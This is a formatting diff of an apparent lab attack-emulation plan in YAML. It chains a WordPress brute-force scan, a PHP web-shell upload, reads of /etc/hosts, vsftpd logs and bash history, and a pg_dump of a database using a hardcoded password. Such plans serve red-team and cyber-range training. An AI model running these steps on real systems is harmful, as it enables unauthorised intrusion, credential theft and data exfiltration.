@@ -28,7 +28,7 @@ plan:
                 - 3306
           next:
             - type: result
-              value: OK
+              value: ok
               step: scan-wordpress-site
 
         - name: scan-wordpress-site
@@ -56,7 +56,7 @@ plan:
               options: --script http-wordpress-brute --script-args 'userdb=/opt/resources/user_list.txt,passdb=/opt/resources/pass_list.txt,http-wordpress-brute.threads=3,brute.firstonly=true'
           next:
             - type: result
-              value: OK
+              value: ok
               step: upload-php-shell
 
         - name: upload-php-shell
@@ -90,7 +90,7 @@ plan:
             use_named_session: session-to-wordpress
             module: command
             module_arguments:
-              cmd: cat /etc/hosts
+              command: cat /etc/hosts
           next:
             - type: output
               value: {{ networks.server_net.hosts.wordpress }}
@@ -111,7 +111,7 @@ plan:
                 SESSION: $upload-php-shell|session_id
           next:
             - type: result
-              value: OK
+              value: ok
               step: scan-ftp-server
 
         - name: scan-ftp-server
@@ -126,7 +126,7 @@ plan:
                 RHOSTS: {{ networks.server_net.hosts.vulnerable_ftp }}
           next:
             - type: result
-              value: OK
+              value: ok
               step: scan-database-server
 
         - name: scan-database-server
@@ -163,7 +163,7 @@ plan:
               module_retries: 3
           next:
             - type: result
-              value: OK
+              value: ok
               step: read-ftp-logs
 
         - name: read-ftp-logs
@@ -172,7 +172,7 @@ plan:
             use_named_session: session-to-ftp
             module: command
             module_arguments:
-              cmd: cat /var/log/vsftpd.log
+              command: cat /var/log/vsftpd.log
 
     # Stage 3a
     - name: 3a-user-network-information-gathering
@@ -198,7 +198,7 @@ plan:
                 SESSION: $upload-php-shell|session_id
           next:
             - type: result
-              value: OK
+              value: ok
               step: scan-user-machine
 
         - name: scan-user-machine
@@ -252,12 +252,12 @@ plan:
             use_named_session: session-to-user
             module: command
             module_arguments:
-              cmd: cat ~/.bash_history
+              command: cat ~/.bash_history
               end_checks:
                 - beastdb
           next:
             - type: result
-              value: OK
+              value: ok
               step: get-data-from-database
 
         - name: get-data-from-database
@@ -266,4 +266,4 @@ plan:
             use_named_session: session-to-user
             module: command
             module_arguments:
-              cmd: PGPASSWORD=dbpassword pg_dump -h 192.168.94.21 -U dbuser beastdb
+              command: PGPASSWORD=dbpassword pg_dump -h 192.168.94.21 -U dbuser beastdb
